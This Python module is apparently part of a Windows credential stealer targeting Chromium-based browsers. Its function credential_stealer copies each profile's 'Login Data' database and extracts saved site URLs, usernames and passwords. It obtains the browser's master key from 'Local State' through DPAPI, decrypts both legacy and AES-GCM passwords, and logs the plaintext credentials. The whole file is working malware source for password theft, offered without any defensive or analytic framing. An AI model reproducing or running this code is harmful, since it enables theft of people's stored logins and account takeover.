""" IMPORTS """
# Utilities
import json
import sqlite3
from util import TEMP_PATH, profiles_db_copy, log_file

# Cryptography
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import pywintypes


""" CONSTANTS """
# Encryption key prefix
ENC_KEY_PREFIX = len('DPAPI')

# Password encryption format: {prefix}{nonce}{encrypted_payload}{additional_data}
ENC_PREFIX_LEN = len('v10')
ENC_NONCE_LEN = 96 // 8
ENC_ADD_DATA_LEN = 128 // 8



def credential_stealer(browser: dict) -> None:
    """ Steals credentials from a browser and places them into the logs directory """
    # Examine each profile
    db_names = profiles_db_copy(browser, 'Login Data')
    for db_name in db_names:
        # Access sqlite3 database
        db_path = f'{TEMP_PATH}\\{db_name}'
        db_connection = sqlite3.connect(db_path)
        cursor = db_connection.cursor()

        # Extract encrypted credentials from databasee
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        data = cursor.fetchall()

        # Decrypt credentials
        encryption_key = get_encryption_key(browser['path'])
        credentials = decrypt_credentials(data, encryption_key)

        # Logs credentials
        if credentials:
            log_file(credentials, db_name)

        # Close sqlite3 connection
        cursor.close()
        db_connection.close()


def get_encryption_key(browser_path: str) -> str:
    """ Retrieve the encryption / master key for AES encryption and decryption """
    # Extract the encrypted encryption key from local state
    local_state_path = browser_path + r'\Local State'
    with open(local_state_path, 'r') as f:
        encryption_key = json.load(f)['os_crypt']['encrypted_key']
    # Decode the key and remove the 'DPAPI' prefix
    encryption_key = b64decode(encryption_key)[ENC_KEY_PREFIX:]
    # Decrypt the key using the win32crypt API
    encryption_key = CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    return encryption_key


def decrypt_credentials(data: list[tuple], encryption_key: str) -> list[dict]:
    """ Decrypts the encrypted credentials (specifically passwords) """
    credentials = []
    for url, username, encrypted_password in data:
        # Decrypt password
        decrypted_password = ''
        try:
            # Try to decrypt passwords saved on Chrome versions earlier than 80
            decrypted_password = decrypt_password_legacy(encrypted_password)
        except pywintypes.error:
            # Try to decrypt passwords saved on Chrome versions 80 or later
            decrypted_password = decrypt_password(encrypted_password, encryption_key)

        # Add extracted credentials to a list
        credentials.append({
            'url': url,
            'username': username,
            'password': decrypted_password,
        })

    return credentials


def decrypt_password(encrypted_password: str, encryption_key: str):
    """ Decrypt passwords saved on Chrome version >= 80 """
    # encrypted password format: {prefix}{nonce}{encrypted_payload}{additional_data}
    # Extract nonce and encrypted payload (containing plaintext password)
    nonce = encrypted_password[ENC_PREFIX_LEN: ENC_PREFIX_LEN + ENC_NONCE_LEN]
    encrypted_payload = encrypted_password[ENC_PREFIX_LEN + ENC_NONCE_LEN: -ENC_ADD_DATA_LEN]
    # Decipher the AES-encrypted payload with encryption key and nonce
    cipher = AES.new(encryption_key, AES.MODE_GCM, nonce)
    extracted_password = cipher.decrypt(encrypted_payload).decode('utf-8')
    return extracted_password


def decrypt_password_legacy(encrypted_password: str):
    """ Decrypt passwords saved on Chrome version < 80 """
    return CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
